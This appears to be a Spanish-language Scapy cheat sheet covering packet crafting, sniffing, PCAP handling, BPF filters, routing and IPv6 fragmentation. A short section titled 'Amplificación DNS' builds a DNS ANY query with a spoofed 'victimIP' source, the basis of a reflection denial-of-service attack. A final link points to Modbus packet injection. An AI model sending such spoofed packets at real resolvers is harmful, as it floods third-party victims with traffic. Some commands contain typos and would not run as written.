# Scapy

```sh
# Entrar en el interprete de scapy
$ scapy

# Podemos ver los protocolos soportados por scapy.
scapy> ls()
# Con lsc() vemos las funciones disponibles en scapy
scapy> lsc()

# Ejmplo de paquete ICMP
# Es necesario declarar cada una de las capas que componen el paquete.
# En este caso, necesitamos una capa Ethernet, IP, ICMP y finalmente los datos raw de aplicacion.
scapy> packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD" 

# Con ls() tambien podemos enseñar la estructura de un paquete determinado.
# Incluye la información de cada una de las capas del paquete
scapy> ls(packet)

# Con sendp enviamos el paquete a su correspondiente destino
scapy> sendp(packet)
# Con las opciones inter y loop podemos enviar el paquete de forma indefinida cada N segundos
scapy> sendp(paquet, loop=1, inter=1)
# Para enviar y recibir paquetes, podemos usar srp1
scapy> response = srp1(packet)
scapy> ls(response)
scapy> response.show()
scapy> packet.summary()

# Para ver el paquete recibido en un formato mucho mas amigable y simplificado.
scapy> _.show() 
scapy> _.summary()

# Con sniff podemos capturar paquetes del mismo modo que lo hacen herramientas como tcpdump o wireshark
scapy> pkts = sniff(iface="wlan0", count=3)
scapy> pkts[0] 
scapy> pkts[1] 
scapy> pkts[2]

# Si queremos almacenar un conjunto de paquetes en un fichero PCAP, podemos utilizar la funcion wrpcap
scapy> wrpcap("demo.pcap", pkts)
# Con la funcion rdpcap podemos leer un fichero pcap y obtener un listado de paquetes que pueden ser manejados desde python
scapy> readed = rdpcap("demo.pcap")
scapy> readed[0]
scapy> readed[1]

# Scapy soporta el formato BPF (Berkeley Packet Filters) 
# el cual es un formato estandar para aplicar filtros sobre paquetes de red.
# Estos filtros pueden aplicarse sobre un conjunto de paquetes o directamente sobre una captura activa.
scapy> icmpPkts = sniff(iface="wlan0", filter="icmp" count=3) # filtrar por paquetes ICMP
$ ping www.google.com

scapy> icmpPkts[0]
scapy> icmpPkts[1]
scapy> icmpPkts[2]
scapy> sniff(iface="eth0", count=3, prn=lambda x: x.summary(), filter="icmp")
# Otra caracteristica interesante de la función sniff, es que cuenta con el atributo prn
# el cual permite ejecutar una función cuando se captura un paquete.
# Se trata de algo muy util si queremos manipular y reinyectar paquetes de datos

# Desde el interprete, tenemos acceso al comando conf,
# el cual nos permite ver y editar la configuración con la que trabaja Scapy
scapy> conf 
scapy> conf.route
# Manipular la tabla de ruteo que tiene scapy internamente
scapy> conf.route.add[net="192.168.2.0/24", gw="192.168.2.1"]
scapy> conf.route
scapy> conf.route.resync()
scapy> conf.route
```

**Fragmentación**

```python
p = IPv6(dst="")/IPv6ExtHdrFragment()/ICMPv6EchoRequest()/Raw(load="A"*400) # paquete muy grande que queremos enviar a la red

fr = fragment6(p, 100) # fragmenta el paquete grande en 100bytes
for i in fr:
    send(i, iface="eth0")
```

**Amplificación DNS**

```python
# dig ANY fwhibbit.es @8.8.8.8
packet = IP(dst="8.8.8.8", src="victimIP")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="fwhibbit.es", qtype=255)) # qtype 255 es como el ANY (toda la info posible)

send(packet)
```

**Modbus**

[here](https://rodrigocantera.com/en/modbus-tcp-packet-injection-with-scapy/)
